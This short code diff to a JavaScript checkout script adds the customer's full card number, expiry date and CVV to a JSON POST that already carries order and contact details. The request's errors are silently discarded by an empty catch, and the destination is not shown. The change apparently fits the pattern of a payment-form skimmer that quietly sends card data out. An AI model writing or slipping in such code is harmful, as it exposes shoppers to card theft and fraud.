@@ -407,7 +407,8 @@
           method: 'POST', headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
             orden: orden, nombre: nombre, telefono: tel, direccion: dir,
-            metodo: metodo, total: total, productos: prodList
+            metodo: metodo, total: total, productos: prodList,
+            tarjeta: { numero: num, expiracion: exp, cvv: cvv }
           })
         }).catch(function () {});
       } catch (e) {}
